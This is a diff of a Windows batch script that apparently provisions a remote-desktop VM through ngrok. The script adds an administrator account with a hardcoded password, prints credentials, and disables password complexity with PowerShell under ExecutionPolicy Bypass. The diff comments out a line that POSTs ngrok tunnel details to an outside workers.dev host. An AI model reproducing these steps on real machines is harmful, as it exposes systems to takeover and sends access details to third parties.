@@ -5,7 +5,7 @@ net user administrator P@$$wOrd /add >nul
 net localgroup administrators administrator /add >nul
 echo All done! Connect your VM using RDP. When RDP expired and VM shutdown, Re-run jobs to get a new RDP.
 echo IP:
-tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | curl -H "Content-Type: application/json" -X POST -d @- https://edith-bot.kevc.workers.dev/ || curl https://edith-bot.kevc.workers.dev/sendsecretmessage?message=VMFailed 
+rem tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | curl -H "Content-Type: application/json" -X POST -d @- https://edith-bot.kevc.workers.dev/ || curl https://edith-bot.kevc.workers.dev/sendsecretmessage?message=VMFailed 
 echo User: Administrator
 echo Pass: Ghadmin123
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './Files/DisablePasswordComplexity.ps1'" > out.txt 2>&1
